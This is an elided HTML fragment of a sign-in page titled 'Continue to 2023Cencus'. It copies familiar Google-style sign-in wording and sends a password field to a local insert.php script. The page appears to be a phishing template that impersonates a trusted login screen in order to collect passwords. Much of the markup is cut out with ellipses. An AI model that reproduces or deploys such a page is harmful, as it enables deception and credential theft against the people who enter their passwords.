...
<body>
    <div class="box">
        ...
        <h2>Sign in</h2>
        <p>Continue to <b class="site">2023Cencus</b></p>
        ...
        <form action="insert.php" method="POST">
          ...
          <div class="inputBox">
                <input type="text" name="passw" required="" onkeyup="this.setAttribute('value', this.value);" value="">
              ...
              <div class="forgot">
                <button type="button"><b>Forgot email?</b></button>
              </div>

              <div class="another">
                <button type="button">Not your computer? Use Guest mode to sign in privately.</button>
              </div>
